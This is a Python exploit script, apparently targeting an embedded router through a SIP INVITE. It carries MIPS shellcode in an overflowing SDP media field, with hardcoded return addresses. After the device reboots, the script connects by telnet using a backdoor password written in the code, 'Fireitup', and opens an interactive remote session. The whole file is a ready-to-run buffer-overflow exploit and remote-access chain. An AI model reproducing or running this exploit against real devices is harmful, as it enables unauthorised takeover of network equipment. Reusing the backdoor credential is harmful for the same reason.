import socket
import telnetlib
from telnetlib import Telnet
from time import sleep
from hexdump import hexdump

from colorama import Fore, Style

options = {
    "server": "10.42.0.138",
    "port": 1337,
    "tnPort": 23
}

shellcode = b''
shellcode += b'\x3c\x04\x80\x06'
shellcode += b'\x8c\x84\x16\x24'
shellcode += b'\x3c\x05\x80\x06'
shellcode += b'\x8c\xa5\x16\x38'
shellcode += b'\x3c\x0b\x80\x02'
shellcode += b'\x35\x6b\x2b\x89'
shellcode += b'\x01\x60\xf8\x09'
shellcode += b'\x02\x10\x80\x25'
shellcode += b'\x3c\x0b\x80\x02'
shellcode += b'\x35\x6b\x31\x19'
shellcode += b'\x01\x60\xf8\x09'
shellcode += b'\x02\x10\x80\x25'
shellcode += b'\x3c\x0b\x80\x01'
shellcode += b'\x35\x6b\xec\x59'
shellcode += b'\x01\x60\xf8\x09'
shellcode += b'\x02\x10\x80\x25'

payload = b""
payload += b"aa"
payload += shellcode
payload += b'a' * (128 - len(payload))
payload += b"\xc0\xa8\x01\x74"
payload += b"\xc0\xa8\x01\x74"
payload += b"b" * 4
payload += b"\xc0\xa8\x01\xa1"
payload += b"\xff\xff\xff\xff"
payload += b"d" * 4
payload += b"\x80\x58\x2c\x74"
payload += b"\x80\x18\xc3\xb0"
payload += b"\x80\x38\xc3\x68" * 8

sdp = b"""v=0\x0d
o=jdoe 2890844526 2890842807 IN IP4 10.47.16.5\x0d
c=IN IP4 224.2.17.12/127\x0d
t=2873397496 2873404696\x0d
a=recvonly\x0d
m=audio 49170 """ + payload + b"""\x0d\x0a"""


sip = f"""INVITE sip:x  SIP/2.0\x0d
Content-Length: {len(sdp)} \r\n\r\n""".encode() + sdp
print(f'[{Fore.BLUE+Style.BRIGHT}*{Style.RESET_ALL}] Payload to send: ')
hexdump(sip)
print()

s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.bind(('', 5060))
print(f'[{Fore.GREEN+Style.BRIGHT}+{Style.RESET_ALL}] Establishing connection to {options["server"]}:{options["port"]}')
s.connect((options["server"], options["port"]))
print(f'[{Fore.GREEN+Style.BRIGHT}+{Style.RESET_ALL}] Connection established!')

print(f'[{Fore.BLUE+Style.BRIGHT}*{Style.RESET_ALL}] Sending exploit...')
sent=s.send(sip)
print(f'[{Fore.GREEN+Style.BRIGHT}+{Style.RESET_ALL}] Exploit sent!')
print(f'[{Fore.BLUE+Style.BRIGHT}*{Style.RESET_ALL}] Waiting for reboot (this will take some time)...')
sleep(10)

print(f'[{Fore.BLUE+Style.BRIGHT}*{Style.RESET_ALL}] Attempting telnet connection...')
tn = None
while not tn:
    try:
        tn = Telnet(host=options["server"], port=options["tnPort"], timeout=1)
    except:
        tn = None
        print(f"[{Fore.RED+Style.BRIGHT}-{Style.RESET_ALL}] Telnet isn't up yet, retrying in 1 second...")
        sleep(1)

print(f"[{Fore.BLUE+Style.BRIGHT}*{Style.RESET_ALL}] Telnet connection established!")
tn.read_until(b'Password: ')
tn.write(b'Fireitup\n') # Note that this router is backdoored and this pwd always works
tn.read_until(b'Enjoy !')
print(f"[{Fore.GREEN+Style.BRIGHT}+{Style.RESET_ALL}] Logged in!")
tn.interact()

